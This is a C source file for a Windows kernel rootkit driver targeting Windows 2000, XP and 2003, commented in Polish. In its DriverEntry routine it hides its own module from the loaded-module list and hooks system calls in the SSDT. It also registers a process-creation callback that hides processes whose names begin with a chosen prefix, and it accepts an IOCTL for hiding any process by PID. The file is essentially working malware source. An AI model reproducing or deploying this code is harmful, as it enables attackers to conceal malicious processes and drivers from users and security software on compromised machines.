#include <ntddk.h>

#include "rootkit.h"
#include "rk_Tools.h"
#include "rk_DKOM.h"
#include "rk_Hook.h"

#define		FILE_DEVICE_SHADOW_DRIVER	FILE_DEVICE_UNKNOWN

//IOCTL codes
#define		IOCTL_HIDE_PROCESS			(ULONG) CTL_CODE(FILE_DEVICE_SHADOW_DRIVER, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

PMODULE_ENTRY	g_PsLoadedModuleList;

PDEVICE_OBJECT	gp_DeviceObject = NULL;
ULONG			gp_ProcNameOffset = 0;
PMODULE_ENTRY	gp_HiddenDriver = NULL;

NTOSKRNL_OFFSETS    offsets;

UNICODE_STRING hidePrefixW;
char *hidePrefixA;
char *masterPrefix;

NTOSKRNL_OFFSETS WIN2K_OFFS		= { 0x0, 0x9C, 0xA0 };
NTOSKRNL_OFFSETS WINXP_OFFS		= { 0x0, 0x84, 0x88 };
NTOSKRNL_OFFSETS WIN2K3_OFFS	= { 0x0, 0x84, 0x88 };

NTSTATUS DispatchGeneral(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp);
NTSTATUS DriverEntry(IN PDRIVER_OBJECT  DriverObject,IN PUNICODE_STRING RegistryPath);
BOOLEAN SetupOffsets(ULONG processNameOffset);

__declspec(dllimport) ULONG NtBuildNumber;

/*
*  Procedura jest callbackiem, wywolywanym przy kazdym utworzeniu badz zamknieciu procesu.
*  Rejestracja procedury odbywa sie przez wywolanie PsSetCreateProcessNotifyRoutine.
*  Przy wyladowaniu sterownika z pamieci nalezy wyrejestrowac ta procedure. W innym 
*  przypadku system pamietajacy adres tej procedury bedzie chcial ja wywolac co zakonczy
*  sie BSODem.
*/
VOID ProcessNotify(
	IN HANDLE  hParentId, 
	IN HANDLE  hProcessId, 
	IN BOOLEAN bCreate
	)
{
    PEPROCESS eproc = NULL;
    PCHAR processName = NULL;
    
    if (bCreate) {
       PsLookupProcessByProcessId( hProcessId , &eproc );
       if (eproc != NULL) {
          ULONG len = 0;
          len = strlen(masterPrefix);
  		  processName = (PCHAR) ( (ULONG)eproc + offsets.processName);
  		  if (processName!= NULL) {
    		  if (strlen(processName) >= len) {
                  if (RtlCompareMemory( processName, masterPrefix, len ) == len) {
    //                DbgPrint("OnProcessHide\n");
                    OnProcessHide( (ULONG)hProcessId );                     
                  }
              }
          }
       }
       DbgPrint("On process create PID=%ld\n",hProcessId);
    }
    else
       DbgPrint("On process destroy PID=%ld\n",hProcessId); 
        
    return;    
}

/*
* Rejestrowana przy starcie sterownika (DriverEntry) procedura wykonywana podczas 
* otwarcia uzadzenia sterownika, czy to przez aplikacje trybu uzytkownika czy inny driver.
* W tym przypadku ze sterownika korzysta aplikacja w user mode.
*/

NTSTATUS OnDriverCreate( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
{
	NTSTATUS status = STATUS_SUCCESS;
	DbgPrint("ROOTKIT: OnDriverCreate\n");

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest( Irp, IO_NO_INCREMENT );
	return status;
}

/*
* Rejestrowana przy starcie sterownika (DriverEntry) procedura wykonywana podczas 
* zamykania uzadzenia sterownika, czy to przez aplikacje trybu uzytkownika czy inny driver.
* W tym przypadku ze sterownika korzysta aplikacja w user mode.
*/

NTSTATUS OnDriverClose( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
{
	NTSTATUS status = STATUS_SUCCESS;
	DbgPrint("ROOTKIT: OnDriverClose");

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest( Irp, IO_NO_INCREMENT );	
	return status;
}

/*
* Kolejna rejestrowana przy starcie sterownika (DriverEntry) procedura.
* Wywolywana jest podczas operacji wyladowania sterownika z systemu.
* Tutaj umieszczone sa wszystkie operacja zwalniania zasobow uzywanych przez sterownik.
* W naszym przypadku jest to m.in. usuniecie hookow z SSDT oraz wyrejestrowanie 
* callbacka ProcessNotify.
*/

VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{
	PROOTKIT_EXT devExt;
	KTIMER kTimer;
	LARGE_INTEGER  timeout;
	UNICODE_STRING symbolicLink;

	DbgPrint("myRootkit: OnUnload called: %x \n",DriverObject);
	devExt = (PROOTKIT_EXT)DriverObject->DeviceObject->DeviceExtension; 
	
	UnHookApis();

	//Delete symbolic link
	RtlInitUnicodeString( &symbolicLink, ROOTKIT_WIN32_DEV_NAME );
	IoDeleteSymbolicLink( &symbolicLink );

	IoDeleteDevice(gp_DeviceObject);

	PsSetCreateProcessNotifyRoutine( ProcessNotify  , TRUE );

    if ( hidePrefixA )
    	ExFreePool( hidePrefixA );
   	if ( masterPrefix )
    	ExFreePool( masterPrefix);
	
	DbgPrint("OnUnload leaved\n");
}

/*
*  Rejestrowana podczas statru sterownika procedura obslugi pakietow IRP_MJ_DEVICE_CONTROL,
*  sluzacych do komunikacji sterownika z innymi strownikami lub aplikacja w user mode.
*  Rootkit obsluguje IRP o kodzie IOCTL_HIDE_PROCESS. W tym pakiecie sterownik otrzymuje 
*  PID procesu, ktory nalezy ukryc.
*/
NTSTATUS  Driver_IoControl( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
{
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION irpStack; 
	ULONG inputSize;
	ULONG controlCode;
	PVOID pInputBuffer;

    irpStack = IoGetCurrentIrpStackLocation( Irp );
	controlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;
	inputSize = irpStack->Parameters.DeviceIoControl.InputBufferLength;
	pInputBuffer = Irp->AssociatedIrp.SystemBuffer;

	switch (controlCode) 
	{
	case IOCTL_HIDE_PROCESS:
		if (inputSize == sizeof(ULONG)) {
			OnProcessHide( *(ULONG*)pInputBuffer );
		}
		break;

	default:
		break;
	}	

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest( Irp , IO_NO_INCREMENT );
	return status;
}

//----------------------------------------------------------------------------------------
//	DriverEntry
//----------------------------------------------------------------------------------------
//  Procedura startowa steronikow. Nazwa DriverEntry nie jest obowiazkowa, lecz przyjela sie 
//  jako standard.
//  Tutaj dokonujemy wszystkich ustawien sterownika, alokacji zmiennych. 
//  Utworzenia dowiazan symbolicznych za pomoca , ktorych aplikacja z trybu uzytkownika moze 
//  sie latwiej porozumiewac.
//  Ta procedura wywolana jest w kontekscie NTOSKRNL.EXE.
//  Procedura musi zwrocic STATUS_SUCCESS, w celu poprawnego zaladowania sterownika.
//----------------------------------------------------------------------------------------
NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegistryPath )
{	
	NTSTATUS		status = STATUS_SUCCESS;
	UNICODE_STRING	deviceName;
	UNICODE_STRING	symbolicName;
	ULONG i;
	ULONG m,j,k;
	ULONG procNotifyCount;

	DbgPrint("Entered DriverEntry: %x",driverObject);

	driverObject->DriverUnload  = OnUnload;

	//wypelniamy tablice
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
        driverObject->MajorFunction[i] =DispatchGeneral;
    }

	driverObject->MajorFunction[ IRP_MJ_CREATE			] = OnDriverCreate;
	driverObject->MajorFunction[ IRP_MJ_CLOSE			] = OnDriverClose;
	driverObject->MajorFunction[ IRP_MJ_DEVICE_CONTROL	] = Driver_IoControl; 

	//unicode names initialization
	RtlInitUnicodeString( &deviceName, ROOTKIT_DEV_NAME );
	RtlInitUnicodeString( &symbolicName, ROOTKIT_WIN32_DEV_NAME );

	//we are creating communication object that GUI can use to send requsts to driver
	status = IoCreateDevice( driverObject, sizeof( ROOTKIT_EXT ),
								&deviceName,
								FILE_DEVICE_UNKNOWN,			
								0,
								TRUE,							//we allow for only one client
								&driverObject->DeviceObject);

	if (status!=STATUS_SUCCESS) {
		DbgPrint("myRootkit: IoCreateDeviceFailed\n");
		return status;
	}

	status = IoCreateSymbolicLink( &symbolicName, &deviceName );
	if (status!=STATUS_SUCCESS) {
		DbgPrint("IoCreateSymbolicLink failed\n");
		return status;
	}

	hidePrefixA = ExAllocatePool( NonPagedPool, 20);
	if (hidePrefixA == NULL) {
		return STATUS_UNSUCCESSFUL;
	}
	strcpy( hidePrefixA , "myRootkit");
	DbgPrint( "hidePrefixA %s\n",hidePrefixA);

	masterPrefix = ExAllocatePool( NonPagedPool, 10);
	if (masterPrefix == NULL) {
		return STATUS_UNSUCCESSFUL;
	}
	
	strcpy( masterPrefix , "bill");
	DbgPrint( "masterPrefix %s\n",masterPrefix);

	RtlInitUnicodeString( &hidePrefixW, L"myRootkit");	

	gp_DeviceObject = driverObject->DeviceObject;

	gp_ProcNameOffset  = GetProcessNameOffset();

	if ( SetupOffsets( gp_ProcNameOffset ) == FALSE ) {
		DbgPrint("OS Unsupported! Quiting");
		return STATUS_UNSUCCESSFUL;
	}

	g_PsLoadedModuleList =  (PMODULE_ENTRY)FindPsLoadedModuleList(driverObject);

	HideModule();

	SetupIndexes();
	
	HookApis();
	
	PsSetCreateProcessNotifyRoutine( ProcessNotify , FALSE );

	DbgPrint("DriverEntry leaved\n");
	return status;
}

NTSTATUS AbandonRequest(PIRP Irp)
{
	DbgPrint("AbandonRequest\n");
	Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_ACCESS_DENIED;
}

NTSTATUS CompleteRequest(PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	//Irp->IoStatus.Status is gone!!! after we call IoCompleteRequest
	return STATUS_SUCCESS;
}

NTSTATUS DispatchGeneral(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp)
{
	if (DeviceObject == gp_DeviceObject) {
		DbgPrint("Dispach general: DeviceObject: %x \n",DeviceObject);
		return CompleteRequest(Irp);
	}	
	
    DbgPrint("TO SIE NIE POWINNO WYWOLAC NIGDY\n"); 
    return STATUS_UNSUCCESSFUL; 
}

BOOLEAN SetupOffsets(ULONG processNameOffset)
{
	ULONG BuildNumber = (NtBuildNumber & 0x0000FFFF);

	switch (BuildNumber)
	{
	case 2195:
   		DbgPrint("Wykryto instalacje Windows 2000\n");
		offsets = WIN2K_OFFS;
		break;

	case 2600:
   		DbgPrint("Wykryto instalacje Windows XP\n");
		offsets = WINXP_OFFS;
		break;

	case 3790:		
   		DbgPrint("Wykryto instalacje Windows 2003 Server\n");
		offsets = WIN2K3_OFFS;
		break;
	default:
		return FALSE;
		break;
	}

	offsets.processName = processNameOffset;

	return TRUE;
}
